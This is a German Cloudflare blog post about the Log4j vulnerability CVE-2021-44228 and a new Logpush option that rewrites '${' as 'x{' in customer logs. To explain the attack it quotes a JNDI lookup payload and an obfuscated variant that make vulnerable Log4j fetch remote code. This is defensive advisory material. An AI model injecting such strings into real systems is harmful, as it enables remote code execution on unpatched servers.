<div class="post-content lh-copy gray1">
	<p>Am 9. Dezember 2021 erfuhr die Welt von <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>, einer Zero-Day-Sicherheitslücke, die das <a href="https://logging.apache.org/log4j/2.x/index.html" target="_blank">Apache Log4j-Dienstprogramm</a> betrifft. Cloudflare hat sofort <a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/">unsere WAF aktualisiert</a>, um vor dieser Sicherheitslücke zu schützen, aber wir empfehlen unseren Kunden, ihre Systeme so schnell wie möglich zu aktualisieren.</p>
	<p>Wir wissen jedoch, dass viele Cloudflare-Kunden ihre Logs mit Software konsumieren, die Log4j verwendet, daher wehren wir auch alle Exploits ab, die über Cloudflare Logs versucht werden. Zum Zeitpunkt der Erstellung dieses Artikels sehen wir das Exploit-Muster in den Protokollen, die wir an unsere Kunden senden, bis zu 1000 Mal pro Sekunde.</p>
	<p>Ab sofort können Kunden ihre Logpush-Jobs aktualisieren, um Token, die diese Sicherheitslücke auslösen könnten, automatisch zu entfernen. Weitere Informationen hierzu finden Sie in unserer <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options" target="_blank">Dokumentation für Entwickler</a> oder weiter unten.</p>
	<h3 id="wie-der-angriff-funktioniert"><strong>Wie der Angriff funktioniert</strong></h3>
	<p>Wie die Log4j-Sicherheitslücke funktioniert, können Sie <a href="https://blog.cloudflare.com/de-de/inside-the-log4j2-vulnerability-cve-2021-44228-de-de/">in unserem Blog-Beitrag hier nachlesen</a>. Kurz gesagt, ein Angreifer kann etwas wie <code>${jndi:ldap://example.com/a}</code> in eine beliebige Zeichenfolge einfügen. Log4j stellt dann eine Verbindung über das Internet her, um dieses Objekt abzurufen.</p>
	<p>Cloudflare-Protokolle enthalten viele String-Felder, die von Endbenutzern im öffentlichen Internet kontrolliert werden, wie z. B. User Agent und URL-Pfad. Durch diese Sicherheitslücke ist es möglich, dass ein böswilliger Benutzer eine Remotecodeausführung auf einem System veranlassen kann, das diese Felder liest und eine ungepatchte Instanz von Log4j verwendet.</p>
	<h3 id="unser-plan-zur-risikominderung"><strong>Unser Plan zur Risikominderung</strong></h3>
	<p>Leider reicht die Überprüfung auf ein Token wie ${jndi:ldap nicht aus, um sich vor dieser Schwachstelle zu schützen. Aufgrund der Ausdruckskraft der Templatesprache ist es notwendig, auch auf verschleierte Varianten zu prüfen. Wir sehen bereits, dass Angreifer im offenen Internet Varianten wie <code>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</code> verwenden. Daher ist das Schwärzen des Tokens ${ die allgemeinste Möglichkeit, sich gegen diese Schwachstelle zu schützen.</p>
	<p>Das Token <code>${</code> erscheint bis zu 1.000 Mal pro Sekunde in den Protokollen, die wir derzeit an Kunden senden. Eine stichprobenartige Überprüfung einiger Datensätze zeigt, dass viele davon <em>keine</em> Versuche sind, diese Sicherheitslücke auszunutzen. Daher können wir unsere Protokolle nicht sicher schwärzen, ohne dass dies Auswirkungen auf Kunden hätte, die dieses Token in ihren Protokollen erwarten.</p>
	<p>Ab sofort können Kunden ihre Logpush-Aufträge aktualisieren, um die Zeichenfolge <code>${</code> zu entfernen und sie durch <code>x{</code> überall zu ersetzen.</p>
	<p>Um dies zu aktivieren, können Kunden ihre Konfiguration der Logpush-Auftragsoptionen aktualisieren und den Parameter <code>CVE-2021-44228=true</code> einfügen. Detaillierte Anweisungen zur Verwendung der Logpush-API finden Sie in dem Beispiel in <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options" target="_blank">unserer Dokumentation für Entwickler</a>. Bitte beachten Sie, dass diese Option derzeit nicht im Cloudflare Dashboard verfügbar ist und nur über die API geändert werden kann.</p>
</div>